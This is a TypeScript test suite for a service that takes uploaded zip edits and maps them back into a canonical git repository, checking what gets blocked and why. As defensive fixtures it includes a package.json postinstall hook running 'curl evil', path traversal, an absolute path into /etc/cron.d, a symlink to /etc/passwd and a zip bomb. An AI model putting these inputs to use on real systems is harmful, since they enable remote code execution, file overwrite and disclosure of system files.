import { mkdir, writeFile } from 'node:fs/promises';
import { dirname } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { sha256HexSync, type EditionManifestServerSide, type RevisionId } from '@commonforge-org/core';
import { World, type CanonicalRepo } from './helpers.js';
import { makeZip, type ZipSpec } from './zip-writer.js';

let w: World;
let site: CanonicalRepo;
let manifest: EditionManifestServerSide;
let editionFiles: Record<string, string>;
let seq = 0;

const SITE = {
  'index.html': '<h1>Quote</h1>\n',
  'src/quote-view.ts': 'export const view = 1;\n',
  'package.json': '{"name":"site"}\n',
  'tests/quote-contract.test.ts': '// trusted contract test\n',
  'secret/notes.md': 'internal\n',
};

beforeAll(async () => {
  w = await World.create();
  site = await w.canonical('res-website', SITE);
  // the edition the client received (built by the runner)
  const editionRepo = await w.bareRepo('editions', 'ed-site');
  const built = await w.runner().execute(
    await w.delivery({
      kind: 'build-edition',
      editionId: 'ed-site',
      sources: [{ resourceId: 'res-website', canonical: site.coords, sha: site.sha, canonicalPathPrefix: '', editionPathPrefix: 'website', include: ['index.html', 'src/**', 'package.json', 'tests/**'] }],
      editionRepo,
    }),
  );
  expect(built.ok, JSON.stringify(built)).toBe(true);
  const inventory = (built as { receipt: { inventory: EditionManifestServerSide['inventory'] } }).receipt.inventory;
  editionFiles = Object.fromEntries(Object.entries(SITE).filter(([p]) => p !== 'secret/notes.md').map(([p, c]) => [`website/${p}`, c]));
  manifest = {
    editionId: 'ed-site',
    policyRevision: 1,
    sourceReleaseId: 'rel-1' as never,
    exportedSnapshotId: sha256HexSync('snap') as never,
    inventory,
    mappings: [{ editionPathPrefix: 'website', resourceId: 'res-website' as never, canonicalPathPrefix: '', writable: true }],
    canonicalBases: [{ resourceId: 'res-website' as never, revisionId: site.revision }],
    editionRepo,
    allowedAssetNamespaces: [],
    contractVersions: {},
    protectedPaths: ['package.json', 'tests/quote-contract.test.ts'],
  };
});
afterAll(() => w?.close());

async function upload(specs: ZipSpec[]): Promise<string> {
  const key = `org/org1/editions/ed-site/returns/up-${++seq}.zip`;
  const path = w.blobPath(key);
  await mkdir(dirname(path), { recursive: true });
  await writeFile(path, makeZip(specs));
  return key;
}

async function returnJob(key: string, opts: { mode?: 'full' | 'partial'; deletions?: string[]; expectedHead?: RevisionId } = {}) {
  const fork = await w.bareRepo('tasks', `ws-ret-${++seq}`);
  return {
    fork,
    job: {
      kind: 'edition-return' as const,
      edition: manifest,
      upload: { r2Key: key, mode: opts.mode ?? 'partial', ...(opts.deletions ? { deletions: opts.deletions } : {}) },
      target: { resourceId: 'res-website', canonical: site.coords, expectedHead: opts.expectedHead ?? site.revision },
      candidateFork: { taskWorkspaceId: `tw-ret-${seq}`, coords: fork },
    },
  };
}

describe('edition-return', () => {
  it('re-review R-1: a file over a folder, a path below a file and folder case variants are refused alike', async () => {
    for (const name of ['website/secret', 'website/secret/notes.md/x.txt', 'website/Secret/x.txt', 'website/SECRET']) {
      const key = await upload([
        { name: 'website/index.html', data: '<h1>DF</h1>\n' },
        { name, data: 'x\n' },
      ]);
      const { job, fork } = await returnJob(key);
      const r = await w.runner().execute(await w.delivery(job));
      expect(r.ok, `${name}: ${JSON.stringify(r)}`).toBe(true);
      if (!r.ok) return;
      const receipt = r.receipt as { candidate: { sha: string }; allowed: Array<{ canonicalPath: string }>; blocked: Array<{ path: string; reason: string }> };
      expect(receipt.allowed.map((a) => a.canonicalPath), name).toEqual(['index.html']);
      expect(receipt.blocked, name).toEqual([{ path: name, reason: 'not_mapped' }]);
      const git = (args: string[]) => w.git.ok(['--git-dir', decodeURIComponent(new URL(fork.remoteUrl).pathname), ...args], w.root);
      expect(await git(['show', `${receipt.candidate.sha}:secret/notes.md`]), name).toBe('internal\n');
    }
    // published (and protected) folders and files: refused by core before the runner looks
    const key = await upload([
      { name: 'website/index.html', data: '<h1>DF2</h1>\n' },
      { name: 'website/tests', data: 'x\n' },
      { name: 'website/package.json/x', data: 'x\n' },
    ]);
    const { job } = await returnJob(key);
    const r = await w.runner().execute(await w.delivery(job));
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect((r.receipt as { blocked: unknown[] }).blocked).toEqual([
      { path: 'website/package.json/x', reason: 'path_conflict' },
      { path: 'website/tests', reason: 'path_conflict' },
    ]);
  });

  it('review I-2/M-2: case variants of published or protected files and adds onto unpublished files are blocked alike', async () => {
    for (const [name, notes] of [
      ['website/secret/notes.md', 'internal\n'],
      ['website/secret/notes.md', 'guess\n'],
      ['website/SECRET/Notes.MD', 'guess\n'],
    ] as const) {
      const key = await upload([
        { name: 'website/index.html', data: '<h1>Case test</h1>\n' },
        { name: 'website/tests/Quote-Contract.test.ts', data: '// shadow of the protected test\n' },
        { name, data: notes },
      ]);
      const { job } = await returnJob(key);
      const r = await w.runner().execute(await w.delivery(job));
      expect(r.ok, JSON.stringify(r)).toBe(true);
      if (!r.ok) return;
      const receipt = r.receipt as { allowed: Array<{ canonicalPath: string }>; blocked: Array<{ path: string; reason: string }> };
      expect(receipt.allowed.map((a) => a.canonicalPath)).toEqual(['index.html']);
      // identical or different content: the same answer (no existence or content oracle)
      expect(receipt.blocked).toEqual([
        { path: name, reason: 'not_mapped' },
        { path: 'website/tests/Quote-Contract.test.ts', reason: 'case_collision' },
      ].sort((a, b) => (a.path < b.path ? -1 : 1)));
    }
  });

  it('maps allowed changes to a candidate in a fresh task fork; blocks protected/unmapped paths', async () => {
    const key = await upload([
      { name: 'website/index.html', data: '<h1>Better quote</h1>\n' },
      { name: 'website/src/new-banner.ts', data: 'export const banner = true;\n' },
      { name: 'website/package.json', data: '{"name":"site","scripts":{"postinstall":"curl evil"}}\n' },
      { name: 'website/tests/quote-contract.test.ts', data: '// weakened\n' },
      { name: 'elsewhere/x.txt', data: 'x\n' },
      { name: 'website/src/quote-view.ts', data: editionFiles['website/src/quote-view.ts']! },
    ]);
    const { job, fork } = await returnJob(key);
    const d = await w.delivery(job);
    const r = await w.runner().execute(d);
    expect(r.ok, JSON.stringify(r)).toBe(true);
    if (!r.ok) return;
    const receipt = r.receipt as { candidate: { sha: string; candidateId: string }; allowed: Array<{ canonicalPath: string; kind: string }>; blocked: Array<{ path: string; reason: string }> };
    expect(receipt.allowed.map((a) => [a.canonicalPath, a.kind])).toEqual([
      ['index.html', 'modified'],
      ['src/new-banner.ts', 'added'],
    ]);
    expect(receipt.blocked).toEqual([
      { path: 'elsewhere/x.txt', reason: 'not_mapped' },
      { path: 'website/package.json', reason: 'protected' },
      { path: 'website/tests/quote-contract.test.ts', reason: 'protected' },
    ]);
    expect(receipt.candidate.candidateId).toBe(`cand:${job.candidateFork.taskWorkspaceId}:${receipt.candidate.sha}`);
    expect(await w.remoteRefs(fork)).toEqual({ 'refs/heads/main': receipt.candidate.sha });
    // candidate = expectedHead + allowed changes only; history continues from canonical
    const git = (args: string[]) => w.git.ok(['--git-dir', decodeURIComponent(new URL(fork.remoteUrl).pathname), ...args], w.root);
    expect(await git(['show', `${receipt.candidate.sha}:index.html`])).toBe('<h1>Better quote</h1>\n');
    expect(await git(['show', `${receipt.candidate.sha}:package.json`])).toBe(SITE['package.json']);
    expect(await git(['show', `${receipt.candidate.sha}:secret/notes.md`])).toBe('internal\n');
    expect((await git(['rev-parse', `${receipt.candidate.sha}^`])).trim()).toBe(site.sha);
    // canonical untouched; canonical read, fork written
    expect(await w.remoteSha(site.coords, 'refs/heads/main')).toBe(site.sha);
    expect(w.worker.issued.filter((t) => t.jobId === d.signedJob.jobId).map((t) => `${t.repo}:${t.access}`).sort()).toEqual(['res-website:read', `${fork.repoName}:write`].sort());
  });

  it('full mode deletes files missing from the return; explicit deletions in partial mode', async () => {
    const all = Object.entries(editionFiles).filter(([p]) => p !== 'website/src/quote-view.ts').map(([name, data]) => ({ name, data }));
    const { job } = await returnJob(await upload(all), { mode: 'full' });
    const r = await w.runner().execute(await w.delivery(job));
    expect(r.ok && (r.receipt as { allowed: Array<{ canonicalPath: string; kind: string }> }).allowed).toEqual([expect.objectContaining({ canonicalPath: 'src/quote-view.ts', kind: 'deleted' })]);
    const p = await returnJob(await upload([]), { mode: 'partial', deletions: ['website/index.html'] });
    const r2 = await w.runner().execute(await w.delivery(p.job));
    expect(r2.ok && (r2.receipt as { allowed: Array<{ canonicalPath: string; kind: string }> }).allowed).toEqual([expect.objectContaining({ canonicalPath: 'index.html', kind: 'deleted' })]);
  });

  it.each([
    ['traversal', [{ name: '../../escape.txt', data: 'x' }]],
    ['absolute path', [{ name: '/etc/cron.d/x', data: 'x' }]],
    ['symlink', [{ name: 'website/link', data: '/etc/passwd', mode: 0o120777 }]],
    ['zip bomb', [{ name: 'website/bomb.txt', data: new Uint8Array(3 * 1024 * 1024) }]],
  ] as Array<[string, ZipSpec[]]>)('refuses an unsafe upload (%s) with scope_violation and pushes nothing', async (_label, specs) => {
    const { job, fork } = await returnJob(await upload([{ name: 'website/index.html', data: 'changed\n' }, ...specs]));
    const r = await w.runner().execute(await w.delivery(job));
    expect(r).toMatchObject({ ok: false, code: 'scope_violation' });
    expect(await w.remoteRefs(fork)).toEqual({});
  });

  it('applies on top of a newer expectedHead, but a file changed upstream since the edition is a textual_conflict', async () => {
    const newer = await w.advanceCanonical(site, { 'about.html': 'about\n' }, 'unrelated upstream change');
    const newerRev = (site.revision.replace(site.sha, newer)) as RevisionId;
    const { job } = await returnJob(await upload([{ name: 'website/index.html', data: '<h1>Client</h1>\n' }]), { expectedHead: newerRev });
    const r = await w.runner().execute(await w.delivery(job));
    expect(r.ok, JSON.stringify(r)).toBe(true);

    const clash = await w.advanceCanonical({ ...site, sha: newer }, { 'index.html': '<h1>Dev changed it</h1>\n' }, 'upstream edit');
    const clashRev = site.revision.replace(site.sha, clash) as RevisionId;
    const c = await returnJob(await upload([{ name: 'website/index.html', data: '<h1>Client</h1>\n' }]), { expectedHead: clashRev });
    const r2 = await w.runner().execute(await w.delivery(c.job));
    expect(r2).toMatchObject({ ok: false, code: 'textual_conflict' });
    if (!r2.ok) expect(r2.detail).toContain('index.html');
    expect(await w.remoteRefs(c.fork)).toEqual({});
  });

  it('stale_base when the ledger head moved past expectedHead', async () => {
    const { job } = await returnJob(await upload([{ name: 'website/index.html', data: 'x\n' }]));
    const r = await w.runner({ currentHeads: async () => ({ 'res-website': site.revision.replace(site.sha, 'b'.repeat(40)) as RevisionId }) }).execute(await w.delivery(job));
    expect(r).toMatchObject({ ok: false, code: 'stale_base' });
  });
});
